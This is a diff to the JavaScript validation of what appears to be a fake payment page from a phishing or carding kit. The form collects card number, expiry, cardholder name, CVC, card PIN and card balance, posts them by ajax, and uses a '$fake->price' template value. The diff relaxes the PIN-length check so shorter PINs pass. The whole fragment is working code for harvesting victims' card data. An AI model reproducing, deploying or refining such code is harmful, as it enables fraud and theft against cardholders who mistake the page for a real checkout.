@@ -197,7 +197,7 @@
                 let valid_card = !(month > 12 || (month < current_moth && year <= current_year));
                 let ccnum_length = $.trim(ccnum.unmask().val()).length;
                 ccnum.mask("9999 9999 9999 9999");
-                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length > 3 && valid_card) {
+                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && valid_card) {
                     $('#carddata').css('display', 'none');
                     load(3000);
                     $('#balance_check').css('display', '');
@@ -206,7 +206,7 @@
                     !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
                     (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
                     cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
-                    cpin.val().length < 4 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
+                    cpin.val().length < 3 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
                 }
             }
 
@@ -242,7 +242,7 @@
                 let ccnum_unmask = ccnum.unmask().val()
                 let ccnum_length = $.trim(ccnum_unmask).length;
                 ccnum.mask("9999 9999 9999 9999");
-                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length > 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
+                if (ccnum_length >= 16 && expdate.val().length === 5 && cardholder.val().length && cvc.val().length === 3 && cpin.val().length >= 3 && card_balance.val().length && card_balance.val() > 1 && parseInt(card_balance.val()) !== parseInt("{{$fake->price}}") && valid_card) {
                     $('#paybutton').css('background', 'gray').attr('disabled', '1');
                     $.ajax({
                         type: "POST",
@@ -270,7 +270,7 @@
                     !cardholder.val().length ? cardholder.css("border-color", "red") : cardholder.css("border-color", "");
                     (!expdate.val().length < 5 || !valid_card) ? expdate.css("border-color", "red") : expdate.css("border-color", "");
                     cvc.val().length < 3 ? cvc.css("border-color", "red") : cvc.css("border-color", "");
-                    cpin.val().length < 4 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
+                    cpin.val().length < 3 ? cpin.css("border-color", "red") : cpin.css("border-color", "");
                     ccnum_length < 16 ? ccnum.css("border-color", "red") : ccnum.css("border-color", "");
                     !card_balance.val().length ? card_balance.css("border-color", "red") : card_balance.css("border-color", "");
                     if (!card_balance.val().length || card_balance.val() < 5 || parseInt(card_balance.val()) === parseInt("{{$fake->price}}")) {
